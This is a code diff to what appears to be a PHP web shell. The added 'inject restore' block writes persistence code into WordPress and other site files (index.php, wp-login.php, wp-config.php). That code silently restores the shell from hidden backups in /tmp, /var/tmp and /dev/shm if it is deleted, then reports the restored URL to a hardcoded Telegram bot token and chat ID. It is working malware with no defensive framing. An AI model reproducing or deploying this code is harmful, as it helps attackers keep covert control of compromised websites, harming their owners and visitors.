@@ -3284,8 +3284,48 @@ if (isset($_GET['delete_backup']) && isset($_SESSION['loggedin']) && $_SESSION['
 
 // === INJECT RESTORE ===
 if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = inject_restore();
-    sendJsonResponse($result);
+    global $CURRENT_SHELL;
+    
+    $targetFiles = [
+        __DIR__ . '/index.php',
+        __DIR__ . '/wp-login.php',
+        __DIR__ . '/wp-config.php',
+        __DIR__ . '/config.php',
+        __DIR__ . '/wp-load.php',
+        __DIR__ . '/settings.php'
+    ];
+    
+    $restoreCode = '
+if (!function_exists("dkd_restore_' . md5($CURRENT_SHELL) . '")) {
+    function dkd_restore_' . md5($CURRENT_SHELL) . '() {
+        $current_file = "' . $CURRENT_SHELL . '";
+        if (!file_exists(__DIR__ . "/" . $current_file)) {
+            $backup_locations = [
+                "/tmp/" . md5($current_file) . ".inc",
+                "/var/tmp/" . md5($current_file) . ".inc",
+                "/dev/shm/" . md5($current_file) . ".inc",
+                __DIR__ . "/.cache/" . $current_file . ".inc"
+            ];
+            foreach ($backup_locations as $backup) {
+                if (file_exists($backup)) {
+                    @copy($backup, __DIR__ . "/" . $current_file);
+                    @chmod(__DIR__ . "/" . $current_file, 0644);
+                    $domain = $_SERVER["HTTP_HOST"] ?? "localhost";
+                    $protocol = (isset($_SERVER["HTTPS"]) ? "https://" : "http://");
+                    $url = $protocol . $domain . "/" . $current_file;
+                    @file_get_contents("https://api.telegram.org/bot8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4/sendMessage?chat_id=7547598395&text=" . urlencode("🔄 RESTORED: " . $url));
+                    break;
+                }
+            }
+        }
+        $backup = "/tmp/" . md5($current_file) . ".inc";
+        if (!file_exists($backup) && file_exists(__DIR__ . "/" . $current_file)) {
+            @copy(__DIR__ . "/" . $current_file, $backup);
+            @chmod($backup, 0444);
+        }
+    }
+    dkd_restore_' . md5($CURRENT_SHELL) . '();
+}
 }
 
 // === AUTO PREPEND ===
